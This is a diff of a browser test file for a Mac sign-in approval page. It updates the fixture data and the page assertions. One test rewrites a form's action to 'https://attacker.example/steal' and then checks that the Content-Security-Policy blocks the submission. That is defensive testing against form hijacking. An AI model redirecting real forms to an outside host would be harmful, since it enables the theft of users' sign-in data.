@@ -110,12 +110,18 @@ before(async () => {
           async first() {
             if (sql.includes("FROM account_pairings"))
               return {
+                account_version: 1,
+                token_hash: "b".repeat(64),
                 status: "pending",
                 expires_at: Date.now() + 60_000,
                 device_id: "a".repeat(64),
+                device_name: "Test MacBook",
               }
-            assert.match(sql, /FROM subscriptions/)
-            return null
+            assert.fail(`Unexpected fixture query: ${sql}`)
+          },
+          async all() {
+            assert.match(sql, /FROM desktop_sessions/)
+            return { results: [] }
           },
         }
       },
@@ -186,7 +192,14 @@ test("Mac approval sign-out clears the hosted session through its cross-origin r
     }
   })
   await page.goto(`${origin}/account/activate?code=${pairingCode}`)
-  assert.match(await page.locator("h1").innerText(), /Subscription required/)
+  assert.equal(await page.locator("h1").innerText(), "Continue signing in")
+  assert.match(await page.locator("main").innerText(), /Test MacBook/)
+  assert.equal(
+    await page
+      .getByRole("button", { name: "Approve computer sign-in", exact: true })
+      .count(),
+    1
+  )
   await page
     .getByRole("button", { name: "Sign out", exact: true })
     .click({ noWaitAfter: true })
@@ -213,15 +226,16 @@ test("Mac approval still prevents forms from submitting to another origin", asyn
     await route.abort()
   })
   await page.goto(`${origin}/account/activate?code=${pairingCode}`)
+  assert.equal(await page.locator("h1").innerText(), "Continue signing in")
   const violation = page.waitForEvent("console", {
     timeout: 5000,
     predicate: (message) => message.text().includes("form-action"),
   })
-  await page.locator("form").evaluate((form) => {
+  await page.locator('form[action^="/account/activate?"]').evaluate((form) => {
     form.action = "https://attacker.example/steal"
   })
   await page
-    .getByRole("button", { name: "Sign out", exact: true })
+    .getByRole("button", { name: "Approve computer sign-in", exact: true })
     .click({ noWaitAfter: true })
   await violation
   assert.equal(externalRequests, 0)
